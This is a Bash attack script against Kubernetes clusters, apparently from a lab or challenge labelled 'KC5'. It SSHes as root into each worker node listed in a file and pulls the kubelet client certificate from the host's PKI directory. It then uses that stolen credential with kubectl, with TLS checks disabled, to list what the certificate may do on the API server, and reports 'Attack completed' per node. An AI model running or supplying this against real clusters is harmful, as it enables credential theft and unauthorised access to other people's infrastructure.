#!/usr/bin/env bash
set -euo pipefail

FILE_IP="/tmp/iphost"
KEY_PATH="$DATA_PATH/KC5/ssh/ssh-key"

list_node_ips() {
  if [[ ! -f "$FILE_IP" ]]; then
    echo "Error: file '$FILE_IP' not found" >&2
    return 1
  fi

  echo ">> Recover IPs list (file: $FILE_IP)..." >&2
  awk -F'-' '
    /^[[:space:]]*#/ { next }
    /^[[:space:]]*$/ { next }
    NF >= 2 {
      ip=$1; host=$2
      gsub(/^[ \t]+|[ \t\r]+$/, "", ip)
      gsub(/^[ \t]+|[ \t\r]+$/, "", host)
      if (host ~ /^worker([0-9]+)?$/ && ip ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/) {
        print ip
      }
    }
  ' "$FILE_IP" | sort -u
}

# Install kubectl
curl -fsSLo /usr/local/bin/kubectl https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl && \
    chmod +x /usr/local/bin/kubectl

mapfile -t nodes < <(list_node_ips | sed '/^$/d')
if [[ "${#nodes[@]}" -eq 0 ]]; then
  echo "No node found"; exit 1
fi
echo ">> Nodes found (${#nodes[@]}): ${nodes[*]}"
DIR_REMOTE="/host/var/lib/kubelet/pki"

for n in "${nodes[@]}"; do
  CERT_PATH="$DATA_PATH/KC5/cert_node/kubelet-client-current-$n.pem"
  mkdir -p "$(dirname "$CERT_PATH")"

  ssh -p 2222 -o StrictHostKeyChecking=accept-new \
    -i "$KEY_PATH" "root@$n" 'sh -s --' "$DIR_REMOTE" > "$CERT_PATH" <<'REMOTE'
set -eu
dir="${1:-/host/var/lib/kubelet/pki}"
# first try file with date (excluding *current*)
f=$(find "$dir" -maxdepth 1 -type f -name 'kubelet-client-*' ! -name '*current*' -print 2>/dev/null | sort | head -n1 || true)
# if not found, accept every kubelet-client-*
[ -z "$f" ] && f=$(find "$dir" -maxdepth 1 -type f -name 'kubelet-client-*' -print 2>/dev/null | sort | head -n1 || true)
if [ -n "$f" ]; then
  cat "$f"
fi
REMOTE
    kubectl --server="https://$CONTROL_PLANE_NODE:$CONTROL_PLANE_PORT" \
      --insecure-skip-tls-verify=true \
      --client-certificate="$CERT_PATH" \
      --client-key="$CERT_PATH" auth can-i --list
    echo "Attack completed for $n"
done
